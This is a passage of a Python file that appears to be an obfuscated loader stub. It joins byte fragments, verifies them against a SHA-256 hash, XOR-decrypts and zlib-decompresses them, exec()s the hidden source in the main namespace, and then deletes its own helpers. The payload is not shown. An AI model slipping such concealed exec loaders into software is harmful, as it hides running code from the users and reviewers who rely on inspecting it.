_cmcoFGYjbR3dZ8 + _cvAetfIJ0UZ8C6 + _ccXaC91RhXlAsU + _cxHkkbEwefVDgU + _c_O_1zoO2_h1aR + _cqwqJgZ8T_Ebj_ + _cyy6FM1FhOxnWE + _cdcEkMy5vgMIZj + _cjT_xSZKqxffHb + _cqmNdOQJ9IpICf + _cmQpUrMhJB1_Zq + _cnWG6rnbK27_IC + _cybyOxC4aFq2kU + _cbljT0rHFSxuUN + _cfFV_AqZ1p4s0S + _cz8ODYkZC4GEJ7 + _ckoK_GEVlcoCvn + _ck3PXSLTfSue4w + _chT_XqGaFHvQaA + _ceYuPm5HDv8Sy6 + _corGaP9cra9cYS + _csFoNG33xOYXGa + _cwKok3W9PI9ecK + _cxgkiODr4TjZ8m + _ct9pgxkpvKWbW2 + _cumK0H1pXelws1 + _cjsuqdnJqSJmZS + _cyg4FLs1SciEN5 + _cvUl_DE8XomWyl + _clwd02S96UBPiC + _cqI5n31Jf2YTlI + _ckl04tElmb72Eb + _cngZyzBmChzerR + _cthNBtlczICwUL + _cqXWI2NGcs6YbP + _csTYPFMcI2Jtw6 + _cccKbL9FeorCCN + _cibSc22cZphDNE + _cavq431Oy5vbE1 + _czx5i07lkXr9SR + _cn1xGdmqA2q__5 + _cduhIAeD_39aj9 + _cwSSoanI4QOPo_ + _cwRERGVz4LLxVv + _cqurTAtfWarhVw + _cfygdnJk990RUU + _cutCfzXxOPMjvt + _cnpBGUQMkCCYo1 + _cmgUqNbcE6bYqx + _cfbIZPwnikyohy + _cmgaGOmyVW8K3X + _cjroxe8jfZfr1e + _cqTpOzmM4xDty7 + _cbcTqdJYUPGAW2 + _ckYWC3j7K7K50I + _ctdZOUG_8UPkmL + _cu2XO0BtRuWeuD + _czMKGuS0ba35Fx + _chnUjFkpmfGc3n)
if __import__('hashlib').sha256(_poqTczfxtHXgJd).hexdigest() != '404338330fd2f100750d0027a01e2fc64811c9143f3edccae22673f7c582209c':
    __import__('sys').exit(1)
_xl368cURs4YV7N = bytes([38, 61, 63, 149, 68, 10, 4, 142, 124, 10, 186, 252, 182, 97, 196, 60, 52, 231, 213, 103, 245, 110, 36, 187, 253])
_fkmqjCw69fznfgP = bytes([67, 181, 220, 113, 146, 218, 53, 94, 2, 97, 223, 102, 208, 219, 28, 124, 66, 118, 95, 241, 20, 66, 107, 205, 79])

def _fxqwpBjuq1ASYrl(_btrL8_FxvYySYt, _kaUSb8B4i3km8S):
    return bytes(_btrL8_FxvYySYt[_ikOg2g7QhIWLfl] ^ _kaUSb8B4i3km8S[_ikOg2g7QhIWLfl % len(_kaUSb8B4i3km8S)] for _ikOg2g7QhIWLfl in range(len(_btrL8_FxvYySYt)))

def _fdljO9LSkKkixd0(_tzcEaFHgYPJ2xX):
    import zlib
    return zlib.decompress(_tzcEaFHgYPJ2xX) # Un seul niveau de zlib ici pour simplifier

def _fec4C4DkszNx_3r():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xpwDnLeVoh6s8d = _fxqwpBjuq1ASYrl(_poqTczfxtHXgJd, _xl368cURs4YV7N)
    # 2. Décompression Zlib
    _diEZDTR2ojt80y = _fdljO9LSkKkixd0(_xpwDnLeVoh6s8d)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _diEZDTR2ojt80y.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ng72rEPLlzd4MN = _main.__dict__
    _ng72rEPLlzd4MN.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ng72rEPLlzd4MN)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fec4C4DkszNx_3r()
try:
    del _fxqwpBjuq1ASYrl, _fdljO9LSkKkixd0, _fec4C4DkszNx_3r
    del _poqTczfxtHXgJd, _xl368cURs4YV7N, _fkmqjCw69fznfgP
except:
    pass
